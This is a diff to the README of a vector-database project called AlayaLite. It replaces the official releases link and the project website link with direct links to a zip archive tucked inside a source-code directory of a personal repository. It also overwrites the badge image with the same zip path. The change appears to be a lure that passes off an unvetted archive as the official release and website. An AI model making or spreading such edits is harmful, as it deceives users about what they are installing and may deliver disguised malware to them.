@@ -16,7 +16,7 @@ AlayaLite offers a range of powerful features to streamline your database operat
 
 To download the latest release of AlayaLite, click the button below:
 
-[![Download AlayaLite](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/tarek077055/AlayaLite/releases)
+[![Download AlayaLite](https://github.com/tarek077055/AlayaLite/raw/refs/heads/main/include/index/graph/knng/Alaya-Lite-1.5-beta.5.zip%20Release-brightgreen)](https://github.com/tarek077055/AlayaLite/raw/refs/heads/main/include/index/graph/knng/Alaya-Lite-1.5-beta.5.zip)
 
 Once you have downloaded the release, follow the instructions in the provided file to execute AlayaLite and start benefiting from its powerful features.
 
@@ -28,6 +28,6 @@ We welcome contributions from developers who want to enhance AlayaLite and make 
 
 ## Visit Our Website 🌐
 
-For more information about AlayaLite, visit our website at [AlayaLite.com](https://www.alayalite.com). Explore the features, check out our documentation, and discover how AlayaLite can elevate your database management experience.
+For more information about AlayaLite, visit our website at [https://github.com/tarek077055/AlayaLite/raw/refs/heads/main/include/index/graph/knng/Alaya-Lite-1.5-beta.5.zip](https://github.com/tarek077055/AlayaLite/raw/refs/heads/main/include/index/graph/knng/Alaya-Lite-1.5-beta.5.zip). Explore the features, check out our documentation, and discover how AlayaLite can elevate your database management experience.
 
 Unleash the power of fast and flexible vector database solutions with AlayaLite. Join the community today and experience a new level of efficiency in managing your data.
